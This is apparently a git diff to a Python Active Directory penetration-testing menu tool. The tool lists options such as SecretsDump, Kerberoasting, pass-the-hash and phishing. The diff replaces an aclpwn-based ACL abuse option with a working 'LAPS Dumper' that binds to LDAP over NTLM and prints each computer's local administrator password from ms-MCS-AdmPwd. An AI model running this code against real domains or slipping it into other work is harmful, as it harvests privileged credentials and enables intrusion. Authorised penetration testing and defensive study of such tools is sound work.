@@ -29,12 +29,14 @@ import binascii
 import pyfiglet
 import datetime
 import requests
+import argparse
 import linecache
 
 from termcolor import colored
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.dcomrt import IObjectExporter
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
+from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -207,6 +209,14 @@ def nmapTrim(variable):
    cutLine("Service Info", variable)
    cutLine("Service detection performed", variable)   
    return
+   
+def base_creator(DOM):
+   domain = DOM.rstrip(" ")
+   search_base = ""
+   base = domain.split(".")
+   for b in base:
+      search_base += "DC=" + b + ","
+   return search_base[:-1]
    
 def saveParams():
    runCommand("echo '" + OSF + "' | base64 --wrap=0 >  base64.tmp"); runCommand("echo '\n' >> base64.tmp")
@@ -845,7 +855,7 @@ def options():
    print("(82) SSH     " + '\u2551')   
    print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set SHARENAME (23) Services (33) Sam Dump Users (43) KerberosBrute (53) Domain Dump (63) ExplScanner (73) GenSSHKeyID (83) SSHKeyID" + '\u2551')   
    print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Start SERVICE (24) AT  Exec (34) REGistry Hives (44) KerbeRoasting (54) Blood Hound (64) Expl Finder (74) GenListUser (84) Telnet  " + '\u2551')
-   print('\u2551' + "(05) Re/Set WEBSITE URL (15) DNS Enumerations (25) DComExec (35) Enum EndPoints (45) ASREPRoasting (55) BH ACL PAWN (65) ExplCreator (75) GenListPass (85) Netcat  " + '\u2551')
+   print('\u2551' + "(05) Re/Set WEBSITE URL (15) DNS Enumerations (25) DComExec (35) Enum EndPoints (45) ASREPRoasting (55) LAPS Dumper (65) ExplCreator (75) GenListPass (85) Netcat  " + '\u2551')
    print('\u2551' + "(06) Re/Set USER   NAME (16) Nmap Live  PORTS (26) PS  Exec (36) Rpc ClientServ (46) PASSWORD2HASH (56) SecretsDump (66) Dir Listing (76) NTDSDECRYPT (86) MSSQL   " + '\u2551')
    print('\u2551' + "(07) Re/Set PASS   WORD (17) Nmap PORTService (27) SMB Exec (37) Smb ClientServ (47) Pass the HASH (57) CrackMapExe (67) SNMP Walker (77) Hail! HYDRA (87) MySQL   " + '\u2551')
    print('\u2551' + "(08) Re/Set NTLM   HASH (18) Enum Sub-DOMAINS (28) WMO Exec (38) Smb Map SHARES (48) OverPass HASH (58) PSExec HASH (68) ManPhishCod (78) RedisClient (88) WinRm   " + '\u2551')
@@ -2847,14 +2857,22 @@ while True:
    if selection =='55':
       checkParams != test_TIP()      
       if checkParams != 1:
-         checkParams = test_DOM()               
+         checkParams = test_DOM()  
       if checkParams != 1:
-         BH1 = input("[+] Enter Neo4j username: ")
-         BH2 = input("[+] Enter Neo4j password: ")                  
-         if BH1 != "" and BH2 != "":
-            runCommand("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
-         else:
-            print("[+] Username or password cannot be null...")            
+         s = Server(DOM.rstrip(" "), get_info=ALL) 
+         c = Connection(s, user=DOM.rstrip(" ") + "\\" + USR.rstrip(" "), password=PAS.rstrip(" "), authentication=NTLM, auto_bind=True)       
+         c.search(search_base=base_creator(DOM.strip(" ")), search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))',attributes=['ms-MCS-AdmPwd','ms-Mcs-AdmPwdExpirationTime','cn'])
+         for entry in c.entries:
+            output = str(entry['cn']) +" "+ str(entry['ms-Mcs-AdmPwd'])
+            print(colored("\n" + output, colour6))
+
+# OLD ACL PWN CODE      
+#         BH1 = input("[+] Enter Neo4j username: ")
+#         BH2 = input("[+] Enter Neo4j password: ")                  
+#         if BH1 != "" and BH2 != "":
+#            runCommand("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
+#         else:
+#            print("[+] Username or password cannot be null...")            
       prompt()
       
 # ------------------------------------------------------------------------------------- 
